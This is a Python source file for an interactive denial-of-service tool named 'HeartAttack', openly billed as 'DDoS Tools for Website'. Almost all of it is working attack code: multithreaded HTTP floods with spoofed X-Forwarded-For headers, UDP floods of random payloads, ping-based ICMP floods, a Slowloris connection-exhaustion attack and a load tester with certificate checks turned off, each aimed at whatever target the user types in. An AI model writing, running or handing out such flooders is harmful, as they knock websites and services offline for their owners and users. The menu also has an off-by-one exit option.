import os
import sys
import time
import threading
import socket
import random
import subprocess
import urllib.request
import ssl

class Colors:
    PINK = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def clear_screen():
    os.system('clear')

def show_banner():
    clear_screen()
    print(f"{Colors.PINK}")
    if os.system("figlet -f big HeartAttack > /dev/null 2>&1") != 0:
        print("HeartAttack - No Root Edition")
    else:
        os.system("figlet -f big HeartAttack")
    print(f"{Colors.END}")
    print(f"{Colors.BLUE}{'='*60}{Colors.END}")
    print(f"{Colors.YELLOW}   🚀 DDoS Tools for Website by Dylphiiee🍪 {Colors.END}")
    print(f"{Colors.BLUE}{'='*60}{Colors.END}\n")

def get_ping_time(target):
    try:
        clean_target = target.replace("http://", "").replace("https://", "").split("/")[0]
        
        start_time = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((clean_target, 80))
        sock.close()
        ping_time = (time.time() - start_time) * 1000
        return ping_time
    except:
        return None

def display_attack_info(target, port, duration, elapsed, request_count, success_count, failed_count, ping_time):
    remaining = max(0, duration - elapsed)
    

    rps = request_count / elapsed if elapsed > 0 else 0
    
    os.system('clear')
    print(f"{Colors.PINK}{'='*60}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.CYAN}           DDoS ATTACK IN PROGRESS{Colors.END}")
    print(f"{Colors.PINK}{'='*60}{Colors.END}")
    print(f"{Colors.YELLOW}🌐 Target    : {Colors.GREEN}{target}:{port}{Colors.END}")
    print(f"{Colors.YELLOW}⏱️  Duration  : {Colors.GREEN}{duration}s (Remaining: {remaining:.1f}s){Colors.END}")
    print(f"{Colors.YELLOW}📊 Requests  : {Colors.GREEN}{request_count} (Success: {success_count}, Failed: {failed_count}){Colors.END}")
    print(f"{Colors.YELLOW}🚀 Speed     : {Colors.GREEN}{rps:.1f} requests/second{Colors.END}")
    print(f"{Colors.YELLOW}📡 Ping      : {Colors.GREEN}{ping_time:.2f} ms{Colors.END}")
    print(f"{Colors.PINK}{'='*60}{Colors.END}")
    
    progress = min(100, (elapsed / duration) * 100)
    bar_length = 50
    filled_length = int(bar_length * progress // 100)
    bar = "█" * filled_length + "░" * (bar_length - filled_length)
    print(f"{Colors.CYAN}Progress: [{bar}] {progress:.1f}%{Colors.END}")
    print(f"{Colors.PINK}{'='*60}{Colors.END}")

def http_flood(target, port, duration, threads):
    clear_screen()
    print(f"{Colors.RED}🚀 Starting HTTP Flood attack to {target}...{Colors.END}")
    time.sleep(2)
    
    request_count = 0
    success_count = 0
    failed_count = 0
    start_time = time.time()
    end_time = start_time + duration
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
    ]

    paths = [
        "/", "/admin", "/wp-login.php", "/api", "/search", "/test",
        "/robots.txt", "/sitemap.xml", "/.env", "/config", "/db"
    ]

    def send_requests(thread_id):
        nonlocal request_count, success_count, failed_count
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))
                
                for _ in range(random.randint(5, 15)):
                    try:
                        user_agent = random.choice(user_agents)
                        path = random.choice(paths)
                        request = (
                            f"GET {path} HTTP/1.1\r\n"
                            f"Host: {target}\r\n"
                            f"User-Agent: {user_agent}\r\n"
                            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                            f"Accept-Language: en-US,en;q=0.5\r\n"
                            f"Accept-Encoding: gzip, deflate\r\n"
                            f"Connection: keep-alive\r\n"
                            f"Cache-Control: max-age=0\r\n"
                            f"X-Forwarded-For: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n\r\n"
                        )
                        s.sendall(request.encode())
                        request_count += 1
                        success_count += 1
                    except:
                        failed_count += 1
                        break
                s.close()
            except Exception as e:
                failed_count += 1

    thread_pool = []
    for i in range(threads):
        t = threading.Thread(target=send_requests, args=(i+1,))
        t.daemon = True
        t.start()
        thread_pool.append(t)

    last_ping_check = 0
    ping_time = 0
    
    while time.time() < end_time:
        elapsed = time.time() - start_time
        
        if time.time() - last_ping_check > 5:
            ping_result = get_ping_time(target)
            if ping_result:
                ping_time = ping_result
            last_ping_check = time.time()
        
        display_attack_info(target, port, duration, elapsed, request_count, success_count, failed_count, ping_time)
        time.sleep(0.5)
    
    elapsed = time.time() - start_time
    display_attack_info(target, port, duration, elapsed, request_count, success_count, failed_count, ping_time)
    
    total_time = time.time() - start_time
    print(f"\n{Colors.GREEN}✅ Attack completed!{Colors.END}")
    print(f"{Colors.YELLOW}📊 Total requests: {request_count}{Colors.END}")
    print(f"{Colors.YELLOW}✅ Success: {success_count}{Colors.END}")
    print(f"{Colors.YELLOW}❌ Failed: {failed_count}{Colors.END}")
    print(f"{Colors.YELLOW}⏱️ Duration: {total_time:.2f} seconds{Colors.END}")
    print(f"{Colors.YELLOW}📡 Average: {request_count/total_time:.2f} requests/second{Colors.END}")
    
    input(f"\n{Colors.CYAN}Press Enter to return to menu...{Colors.END}")

def udp_flood(target, port, duration, threads):
    clear_screen()
    print(f"{Colors.RED}🚀 Starting UDP Flood attack to {target}:{port}...{Colors.END}")
    time.sleep(2)
    
    packet_count = 0
    success_count = 0
    failed_count = 0
    start_time = time.time()
    end_time = start_time + duration

    def send_udp(thread_id):
        nonlocal packet_count, success_count, failed_count
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = random._urandom(random.randint(64, 1024))
                sock.sendto(payload, (target, port))
                sock.close()
                
                packet_count += 1
                success_count += 1
            except Exception as e:
                failed_count += 1

    thread_pool = []
    for i in range(threads):
        t = threading.Thread(target=send_udp, args=(i+1,))
        t.daemon = True
        t.start()
        thread_pool.append(t)

    last_ping_check = 0
    ping_time = 0
    
    while time.time() < end_time:
        elapsed = time.time() - start_time
        
        if time.time() - last_ping_check > 5:
            ping_result = get_ping_time(target)
            if ping_result:
                ping_time = ping_result
            last_ping_check = time.time()
        
        display_attack_info(target, port, duration, elapsed, packet_count, success_count, failed_count, ping_time)
        time.sleep(0.5)
    
    elapsed = time.time() - start_time
    display_attack_info(target, port, duration, elapsed, packet_count, success_count, failed_count, ping_time)
    
    total_time = time.time() - start_time
    print(f"\n{Colors.GREEN}✅ Attack completed!{Colors.END}")
    print(f"{Colors.YELLOW}📊 Total packets: {packet_count}{Colors.END}")
    print(f"{Colors.YELLOW}✅ Success: {success_count}{Colors.END}")
    print(f"{Colors.YELLOW}❌ Failed: {failed_count}{Colors.END}")
    print(f"{Colors.YELLOW}⏱️ Duration: {total_time:.2f} seconds{Colors.END}")
    print(f"{Colors.YELLOW}📡 Average: {packet_count/total_time:.2f} packets/second{Colors.END}")
    
    input(f"\n{Colors.CYAN}Press Enter to return to menu...{Colors.END}")

def icmp_flood(target, duration, threads):
    clear_screen()
    print(f"{Colors.RED}🚀 Starting ICMP Flood attack to {target}...{Colors.END}")
    time.sleep(2)
    
    packet_count = 0
    success_count = 0
    failed_count = 0
    start_time = time.time()
    end_time = start_time + duration

    def send_icmp(thread_id):
        nonlocal packet_count, success_count, failed_count
        while time.time() < end_time:
            try:
                result = os.system(f"ping -c 1 -W 1 {target} > /dev/null 2>&1")
                if result == 0:
                    success_count += 1
                else:
                    failed_count += 1
                packet_count += 1
            except:
                failed_count += 1

    thread_pool = []
    for i in range(threads):
        t = threading.Thread(target=send_icmp, args=(i+1,))
        t.daemon = True
        t.start()
        thread_pool.append(t)

    last_ping_check = 0
    ping_time = 0
    
    while time.time() < end_time:
        elapsed = time.time() - start_time
        
        if time.time() - last_ping_check > 5:
            ping_result = get_ping_time(target)
            if ping_result:
                ping_time = ping_result
            last_ping_check = time.time()
        
        display_attack_info(target, "ICMP", duration, elapsed, packet_count, success_count, failed_count, ping_time)
        time.sleep(0.5)
    
    elapsed = time.time() - start_time
    display_attack_info(target, "ICMP", duration, elapsed, packet_count, success_count, failed_count, ping_time)
    
    total_time = time.time() - start_time
    print(f"\n{Colors.GREEN}✅ Attack completed!{Colors.END}")
    print(f"{Colors.YELLOW}📊 Total packets: {packet_count}{Colors.END}")
    print(f"{Colors.YELLOW}✅ Success: {success_count}{Colors.END}")
    print(f"{Colors.YELLOW}❌ Failed: {failed_count}{Colors.END}")
    print(f"{Colors.YELLOW}⏱️ Duration: {total_time:.2f} seconds{Colors.END}")
    print(f"{Colors.YELLOW}📡 Average: {packet_count/total_time:.2f} packets/second{Colors.END}")
    
    input(f"\n{Colors.CYAN}Press Enter to return to menu...{Colors.END}")

def slowloris_attack(target, port, duration, sockets_count):
    clear_screen()
    print(f"{Colors.RED}🚀 Starting Slowloris attack to {target}:{port}...{Colors.END}")
    time.sleep(2)
    
    start_time = time.time()
    end_time = start_time + duration
    sockets_list = []
    request_count = 0
    success_count = 0
    failed_count = 0

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36",
    ]

    for i in range(sockets_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            
            s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
            s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode())
            s.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
            s.send("Accept-Language: en-US,en;q=0.5\r\n".encode())
            s.send("Accept-Encoding: gzip, deflate\r\n".encode())
            s.send("Connection: keep-alive\r\n".encode())
            
            sockets_list.append(s)
            request_count += 1
            success_count += 1
        except:
            failed_count += 1

    last_ping_check = 0
    ping_time = 0
    
    while time.time() < end_time and sockets_list:
        elapsed = time.time() - start_time
        
        if time.time() - last_ping_check > 5:
            ping_result = get_ping_time(target)
            if ping_result:
                ping_time = ping_result
            last_ping_check = time.time()
        
        display_attack_info(target, port, duration, elapsed, request_count, success_count, failed_count, ping_time)
        
        for s in list(sockets_list):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                request_count += 1
                success_count += 1
            except:
                sockets_list.remove(s)
                failed_count += 1
                try:
                    s.close()
                except:
                    pass
        
        time.sleep(random.randint(5, 15))

    for s in sockets_list:
        try:
            s.close()
        except:
            pass

    elapsed = time.time() - start_time
    display_attack_info(target, port, duration, elapsed, request_count, success_count, failed_count, ping_time)
    
    total_time = time.time() - start_time
    print(f"\n{Colors.GREEN}✅ Attack completed!{Colors.END}")
    print(f"{Colors.YELLOW}📊 Total requests: {request_count}{Colors.END}")
    print(f"{Colors.YELLOW}✅ Success: {success_count}{Colors.END}")
    print(f"{Colors.YELLOW}❌ Failed: {failed_count}{Colors.END}")
    print(f"{Colors.YELLOW}⏱️ Duration: {total_time:.2f} seconds{Colors.END}")
    
    input(f"\n{Colors.CYAN}Press Enter to return to menu...{Colors.END}")

def url_load_test(target, duration, threads):
    clear_screen()
    print(f"{Colors.RED}🚀 Starting URL Load Test to {target}...{Colors.END}")
    time.sleep(2)
    
    request_count = 0
    success_count = 0
    failed_count = 0
    start_time = time.time()
    end_time = start_time + duration

    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    def send_request(thread_id):
        nonlocal request_count, success_count, failed_count
        while time.time() < end_time:
            try:
                if not target.startswith(('http://', 'https://')):
                    url = 'http://' + target
                else:
                    url = target
                
                with urllib.request.urlopen(url, context=ssl_context, timeout=5) as response:
                    if response.getcode() == 200:
                        success_count += 1
                    else:
                        failed_count += 1
                request_count += 1
            except Exception as e:
                failed_count += 1

    thread_pool = []
    for i in range(threads):
        t = threading.Thread(target=send_request, args=(i+1,))
        t.daemon = True
        t.start()
        thread_pool.append(t)

    last_ping_check = 0
    ping_time = 0
    
    while time.time() < end_time:
        elapsed = time.time() - start_time
        
        if time.time() - last_ping_check > 5:
            ping_result = get_ping_time(target)
            if ping_result:
                ping_time = ping_result
            last_ping_check = time.time()
        
        display_attack_info(target, "HTTP", duration, elapsed, request_count, success_count, failed_count, ping_time)
        time.sleep(0.5)
    
    elapsed = time.time() - start_time
    display_attack_info(target, "HTTP", duration, elapsed, request_count, success_count, failed_count, ping_time)
    
    total_time = time.time() - start_time
    print(f"\n{Colors.GREEN}✅ Test completed!{Colors.END}")
    print(f"{Colors.YELLOW}📊 Total requests: {request_count}{Colors.END}")
    print(f"{Colors.YELLOW}✅ Success: {success_count}{Colors.END}")
    print(f"{Colors.YELLOW}❌ Failed: {failed_count}{Colors.END}")
    print(f"{Colors.YELLOW}⏱️ Duration: {total_time:.2f} seconds{Colors.END}")
    print(f"{Colors.YELLOW}📡 Average: {request_count/total_time:.2f} requests/second{Colors.END}")
    
    input(f"\n{Colors.CYAN}Press Enter to return to menu...{Colors.END}")

def web_attack():
    clear_screen()
    print(f"{Colors.PINK}")
    if os.system("figlet -f small Web Attack > /dev/null 2>&1") != 0:
        print("Web Attack")
    else:
        os.system("figlet -f small Web Attack")
    print(f"{Colors.END}")
    print(f"{Colors.CYAN}🌐 Select Web Attack Method:{Colors.END}")
    print(f"{Colors.YELLOW}1. HTTP Flood 💦{Colors.END}")
    print(f"{Colors.YELLOW}2. UDP Flood 📨{Colors.END}")
    print(f"{Colors.YELLOW}3. ICMP Flood 📡{Colors.END}")
    print(f"{Colors.YELLOW}4. Slowloris Attack 🐌{Colors.END}")
    print(f"{Colors.YELLOW}5. URL Load Test 🌐{Colors.END}")
    print(f"{Colors.YELLOW}6. Back 🔙{Colors.END}")

    choice = input(f"{Colors.GREEN}🎯 Select method (1-6): {Colors.END}")
    if choice == "6":
        return

    if choice in ["1", "2", "4"]:
        target = input(f"{Colors.GREEN}🌐 Target IP/domain: {Colors.END}")
        port = input(f"{Colors.GREEN}🔌 Port (default: 80): {Colors.END}") or "80"
        try:
            port = int(port)
        except:
            print(f"{Colors.RED}❌ Port must be a number!{Colors.END}")
            time.sleep(2)
            return web_attack()
    elif choice in ["3", "5"]:
        target = input(f"{Colors.GREEN}🌐 Target IP/domain: {Colors.END}")
        port = None
    else:
        print(f"{Colors.RED}❌ Invalid choice!{Colors.END}")
        time.sleep(2)
        return web_attack()
    
    duration = input(f"{Colors.GREEN}⏱️ Duration (seconds): {Colors.END}")
    try:
        duration = int(duration)
    except:
        print(f"{Colors.RED}❌ Duration must be a number!{Colors.END}")
        time.sleep(2)
        return web_attack()
    
    threads = input(f"{Colors.GREEN}🧵 Threads (default: 50): {Colors.END}") or "50"
    try:
        threads = int(threads)
    except:
        print(f"{Colors.RED}❌ Threads must be a number!{Colors.END}")
        time.sleep(2)
        return web_attack()

    if choice == "1":
        http_flood(target, port, duration, threads)
    elif choice == "2":
        udp_flood(target, port, duration, threads)
    elif choice == "3":
        icmp_flood(target, duration, threads)
    elif choice == "4":
        sockets = input(f"{Colors.GREEN}🔗 Number of sockets (default: 100): {Colors.END}") or "100"
        try:
            sockets = int(sockets)
        except:
            print(f"{Colors.RED}❌ Sockets must be a number!{Colors.END}")
            time.sleep(2)
            return web_attack()
        slowloris_attack(target, port, duration, sockets)
    elif choice == "5":
        url_load_test(target, duration, threads)

def main():
    show_banner()

    while True:
        show_banner()
        print(f"{Colors.CYAN}Select option:{Colors.END}")
        print(f"{Colors.YELLOW}1. WebAttack 🌐{Colors.END}")
        print(f"{Colors.YELLOW}3. Exit 🚪{Colors.END}")

        choice = input(f"{Colors.GREEN}🎯 Select option (1-3): {Colors.END}")
        if choice == "1":
            web_attack()
        elif choice == "2":
            print(f"{Colors.PINK}❤️  Thank you for using HeartAttack by Dylphiiee🍪{Colors.END}")
            break
        else:
            print(f"{Colors.RED}❌ Invalid option!{Colors.END}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}⚠️ Program terminated by user{Colors.END}")
        sys.exit(0)
